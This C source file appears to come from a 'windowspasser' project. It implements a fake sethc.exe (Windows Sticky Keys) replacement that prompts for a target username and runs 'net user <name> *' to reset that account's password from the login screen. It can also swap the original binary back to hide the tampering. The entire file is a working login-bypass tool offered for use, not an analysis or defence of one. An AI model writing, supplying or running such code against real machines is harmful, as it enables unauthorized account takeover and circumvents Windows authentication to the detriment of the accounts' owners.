// Part of windowspasser project @github.com

#include "../../headers/fakesethc.h"

int main(void) {
	char curpath[MAX_PATH], orgsethcpath[MAX_PATH]="", fakesethcpath[MAX_PATH]="";
	char username[MAX_LOGONNAME], tmp[2];
	char command[MAX_LOGONNAME + 12];

  puts(JOKE);

	printf("Enter target username: ");
	fgets(username, MAX_LOGONNAME, stdin);
	username[strcspn(username, "\n")] = 0;

  // Replace the original sethc.exe(.sethc.exe) with the fake one(sethc.exe).
	printf("Clean up after password change?(1/0): ");
	fgets(tmp, 2, stdin);
	if (tmp[0] == '1') {
	  // Replace current binary (the fake sethc.exe) with the original one.

    GetCurrentDirectoryA(MAX_PATH, curpath);
		strcat(orgsethcpath, curpath);
		strcat(orgsethcpath, "/.sethc.exe");
		strcat(fakesethcpath, curpath);
		strcat(fakesethcpath, "/sethc.exe");

		CopyFile(orgsethcpath, fakesethcpath, FALSE);
		DeleteFileA(orgsethcpath);
	}
	// Initialize command.
	sprintf(command, "net user %s *", username);

	WinExec(command, 0);

	return 0;
}
